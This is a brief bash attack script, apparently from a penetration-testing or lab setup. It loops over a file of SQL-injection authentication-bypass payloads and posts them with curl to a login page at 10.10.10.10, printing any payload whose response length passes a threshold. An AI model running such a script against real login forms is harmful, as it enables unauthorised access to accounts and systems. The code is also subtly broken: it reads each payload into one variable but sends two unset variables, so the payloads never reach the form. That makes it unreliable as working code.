#!/usr/bin/env bash
target='http://10.10.10.10'
benchmark=56

curl -Ls "$target" --cookie-jar login.cookie
while IFS='' read inject
do
    response=$(curl -Ls -d "username=$username" -d "password=$password" --cookie login.cookie "$target")
    size=${#response}
    if [[ $size -gt $benchmark ]]
    then
        echo "$inject"

    fi
done < ../../Exploitation/SQL/authentication-bypasses.txt
